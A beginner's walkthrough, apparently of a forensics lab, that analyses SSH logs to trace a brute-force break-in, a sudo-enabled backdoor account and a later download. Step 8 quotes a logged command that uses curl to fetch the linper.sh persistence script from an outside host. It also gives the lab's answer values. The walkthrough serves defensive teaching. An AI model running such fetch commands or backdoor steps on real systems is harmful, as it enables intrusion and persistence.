## üéØ What You'll Learn
This guide walks you through a real cybersecurity investigation where we analyze Unix system logs to track how an attacker broke into a server and what they did afterward. Don't worry if you're new to this - we'll explain everything step by step!

## üìö Background Knowledge

### What are System Logs?
Think of system logs as a detailed diary that your computer keeps. Every time someone logs in, runs a command, or something important happens, the system writes it down with a timestamp.

### Key Log Files We're Using:
- **auth.log**: Records all authentication events (logins, failed attempts, privilege changes)
- **wtmp**: Tracks user login/logout sessions with timestamps

### What is SSH?
SSH (Secure Shell) is like a secure remote control for servers. It lets you control a computer from anywhere on the internet, but it requires a username and password.

### What is a Brute Force Attack?
Imagine someone trying to guess your phone passcode by trying every possible combination. A brute force attack does the same thing - it tries thousands of username/password combinations until it finds one that works.

## üîç The Investigation Story

### üìñ The Scenario
A company's Confluence server (a collaboration tool) was attacked. The attacker used brute force to break into the SSH service, gained access, and then did more malicious activities. We need to trace their steps using log files.

---

## üìã Step-by-Step Analysis

### üö® Step 1: Finding the Attack Source
**Question**: What IP address did the attacker use?

**Answer**: `65.2.161.68`

**What to Look For**:
```
Mar  6 06:31:31 ip-172-31-35-28 sshd[2325]: Invalid user admin from 65.2.161.68 port 46380
Mar  6 06:31:31 ip-172-31-35-28 sshd[2325]: Received disconnect from 65.2.161.68 port 46380:11: Bye Bye [preauth]
```

**Beginner Explanation**:
- `Invalid user admin` = Someone tried to log in as "admin" but that user doesn't exist
- `65.2.161.68` = The attacker's IP address (like their internet address)
- `[preauth]` = The connection was closed before successful authentication
- Multiple similar entries = This shows repeated attempts (brute force!)

---

### ‚úÖ Step 2: Finding the Successful Break-in
**Question**: Which account did the attacker successfully access?

**Answer**: `root`

**What to Look For**:
```
Mar  6 06:32:44 ip-172-31-35-28 sshd[2491]: Accepted password for root from 65.2.161.68 port 53184 ssh2
Mar  6 06:32:44 ip-172-31-35-28 sshd[2491]: pam_unix(sshd:session): session opened for user root(uid=0) by (uid=0)
```

**Beginner Explanation**:
- `Accepted password for root` = SUCCESS! The attacker got in as the "root" user
- `root` = The most powerful account on Unix systems (like Administrator on Windows)
- `session opened` = A login session was started
- Same IP address `65.2.161.68` confirms this is our attacker

---

### ‚è∞ Step 3: When Did They Establish a Working Session?
**Question**: What was the UTC timestamp of the manual login?

**Answer**: `2024-03-06 06:32:45`

**Beginner Explanation**:
The first successful login was just an automated script testing credentials. The attacker then manually logged in to actually use the system. We need to find when they established a real working session using the wtmp log file.

---

### üî¢ Step 4: Session Tracking
**Question**: What session number was assigned to the attacker?

**Answer**: `37`

**What to Look For**:
```
Mar  6 06:32:44 ip-172-31-35-28 systemd-logind[411]: New session 37 of user root.
```

**Beginner Explanation**:
- Each login gets a unique session number
- Session 37 was created for the root user at the time of the successful attack
- This helps us track all activities in this specific session

---

### üë§ Step 5: Creating a Backdoor Account
**Question**: What new user account did the attacker create?

**Answer**: `cyberjunkie`

**What to Look For**:
```
Mar  6 06:34:18 ip-172-31-35-28 useradd[2592]: new user: name=cyberjunkie, UID=1002, GID=1002, home=/home/cyberjunkie, shell=/bin/bash
Mar  6 06:35:15 ip-172-31-35-28 usermod[2628]: add 'cyberjunkie' to group 'sudo'
```

**Beginner Explanation**:
- `useradd` = Command to create a new user account
- `usermod` = Command to modify user properties
- `add 'cyberjunkie' to group 'sudo'` = Gave the new account administrator privileges
- This is a "backdoor" - a secret way to get back into the system later

---

### üõ°Ô∏è Step 6: Understanding the Attack Technique
**Question**: What MITRE ATT&CK technique was used?

**Answer**: `T1136.001`

**Beginner Explanation**:
- MITRE ATT&CK is a framework that catalogs cybersecurity attack techniques
- T1136.001 specifically refers to "Create Account: Local Account"
- This helps security professionals understand and defend against common attack patterns

---

### üì§ Step 7: When Did the First Session End?
**Question**: When did the attacker's first SSH session end?

**Answer**: `2024-03-06 06:37:24`

**What to Look For**:
```
Mar  6 06:37:24 ip-172-31-35-28 sshd[2491]: pam_unix(sshd:session): session closed for user root
Mar  6 06:37:24 ip-172-31-35-28 systemd-logind[411]: Removed session 37.
```

**Beginner Explanation**:
- `session closed` = The login session ended
- Session 37 was removed from the system
- The attacker logged out of their first session

---

### üì• Step 8: Using the Backdoor Account
**Question**: What command did the attacker run using their new privileged account?

**Answer**: `/usr/bin/curl https://raw.githubusercontent.com/montysecurity/linper/main/linper.sh`

**What to Look For**:
```
Mar  6 06:39:38 ip-172-31-35-28 sudo: cyberjunkie : TTY=pts/1 ; PWD=/home/cyberjunkie ; USER=root ; COMMAND=/usr/bin/curl https://raw.githubusercontent.com/montysecurity/linper/main/linper.sh
```

**Beginner Explanation**:
- The attacker logged back in using their backdoor account "cyberjunkie"
- `sudo` = Command to run something with administrator privileges
- `curl` = Command to download files from the internet
- They downloaded a script called "linper.sh" (likely a malicious tool)

## üéì Key Learning Points

### üîç What This Investigation Teaches Us:

1. **Log Analysis is Detective Work**: Every action leaves traces in system logs
2. **Brute Force Attacks Leave Obvious Patterns**: Multiple failed attempts from the same IP
3. **Attackers Create Persistence**: They make backdoor accounts to maintain access
4. **Privilege Escalation**: Getting the most powerful account possible (root)
5. **Covering Their Tracks**: Using their own accounts instead of the original compromised one

### üõ°Ô∏è Security Lessons:

1. **Monitor Your Logs**: Regular log analysis can catch attacks early
2. **Strong Password Policies**: Prevent brute force success
3. **Account Monitoring**: Watch for new user accounts being created
4. **Principle of Least Privilege**: Not everyone needs root access
5. **Network Monitoring**: Suspicious downloads should trigger alerts
